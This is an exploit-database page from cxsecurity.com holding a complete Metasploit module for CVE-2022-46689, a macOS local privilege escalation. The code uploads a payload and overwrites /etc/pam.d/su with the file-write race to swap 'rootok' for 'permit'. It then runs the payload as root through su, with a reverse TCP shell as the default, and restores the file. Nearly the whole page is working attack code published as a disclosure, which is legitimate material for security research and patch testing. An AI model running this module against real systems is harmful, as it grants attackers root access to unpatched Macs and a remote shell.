---
title: macOS Dirty Cow Arbitrary File Write Local Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2023020013
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-07
fetch_date: 2025-10-04T05:48:45.673468
---

# macOS Dirty Cow Arbitrary File Write Local Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **macOS Dirty Cow Arbitrary File Write Local Privilege Escalation** **2023.02.06**  Credit:  **[timwr](https://cxsecurity.com/author/timwr/1/)**  Risk: **High**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2022-46689](https://cxsecurity.com/cveshow/CVE-2022-46689/ "Click to see CVE-2022-46689")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Local
Rank = ExcellentRanking
prepend Msf::Exploit::Remote::AutoCheck
include Msf::Post::File
include Msf::Post::OSX::Priv
include Msf::Post::OSX::System
include Msf::Exploit::EXE
include Msf::Exploit::FileDropper
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'macOS Dirty Cow Arbitrary File Write Local Privilege Escalation',
'Description' => %q{
An app may be able to execute arbitrary code with kernel privileges
},
'License' => MSF\_LICENSE,
'Author' => [
'Ian Beer', # discovery
'Zhuowei Zhang', # proof of concept
'timwr' # metasploit integration
],
'References' => [
['CVE', '2022-46689'],
['URL', 'https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.61.2/tests/vm/vm\_unaligned\_copy\_switch\_race.c'],
['URL', 'https://github.com/zhuowei/MacDirtyCowDemo'],
],
'Platform' => 'osx',
'Arch' => ARCH\_X64,
'SessionTypes' => ['shell', 'meterpreter'],
'DefaultTarget' => 0,
'DefaultOptions' => { 'PAYLOAD' => 'osx/x64/shell\_reverse\_tcp' },
'Targets' => [
[ 'Mac OS X x64 (Native Payload)', {} ],
],
'DisclosureDate' => '2022-12-17',
'Notes' => {
'SideEffects' => [ARTIFACTS\_ON\_DISK, CONFIG\_CHANGES],
'Reliability' => [REPEATABLE\_SESSION],
'Stability' => [CRASH\_SAFE]
}
)
)
register\_advanced\_options [
OptString.new('TargetFile', [ true, 'The pam.d file to overwrite', '/etc/pam.d/su' ]),
OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
]
end
def check
version = Rex::Version.new(get\_system\_version)
if version > Rex::Version.new('13.0.1')
CheckCode::Safe
elsif version < Rex::Version.new('13.0') && version > Rex::Version.new('12.6.1')
CheckCode::Safe
elsif version < Rex::Version.new('10.15')
CheckCode::Safe
else
CheckCode::Appears
end
end
def exploit
if is\_root?
fail\_with Failure::BadConfig, 'Session already has root privileges'
end
unless writable? datastore['WritableDir']
fail\_with Failure::BadConfig, "#{datastore['WritableDir']} is not writable"
end
payload\_file = "#{datastore['WritableDir']}/.#{rand\_text\_alphanumeric(5..10)}"
binary\_payload = Msf::Util::EXE.to\_osx\_x64\_macho(framework, payload.encoded)
upload\_and\_chmodx payload\_file, binary\_payload
register\_file\_for\_cleanup payload\_file
target\_file = datastore['TargetFile']
current\_content = read\_file(target\_file)
backup\_file = "#{datastore['WritableDir']}/.#{rand\_text\_alphanumeric(5..10)}"
unless write\_file(backup\_file, current\_content)
fail\_with Failure::BadConfig, "#{backup\_file} is not writable"
end
register\_file\_for\_cleanup backup\_file
replace\_content = current\_content.sub('rootok', 'permit')
replace\_file = "#{datastore['WritableDir']}/.#{rand\_text\_alphanumeric(5..10)}"
unless write\_file(replace\_file, replace\_content)
fail\_with Failure::BadConfig, "#{replace\_file} is not writable"
end
register\_file\_for\_cleanup replace\_file
exploit\_file = "#{datastore['WritableDir']}/.#{rand\_text\_alphanumeric(5..10)}"
exploit\_exe = exploit\_data 'CVE-2022-46689', 'exploit'
upload\_and\_chmodx exploit\_file, exploit\_exe
register\_file\_for\_cleanup exploit\_file
exploit\_cmd = "#{exploit\_file} #{target\_file} #{replace\_file}"
print\_status("Executing exploit '#{exploit\_cmd}'")
result = cmd\_exec(exploit\_cmd)
print\_status("Exploit result:\n#{result}")
su\_cmd = "echo '#{payload\_file} & disown' | su"
print\_status("Running cmd:\n#{su\_cmd}")
result = cmd\_exec(su\_cmd)
unless result.blank?
print\_status("Command output:\n#{result}")
end
exploit\_cmd = "#{exploit\_file} #{target\_file} #{backup\_file}"
print\_status("Executing exploit (restoring) '#{exploit\_cmd}'")
result = cmd\_exec(exploit\_cmd)
print\_status("Exploit result:\n#{result}")
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020013)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top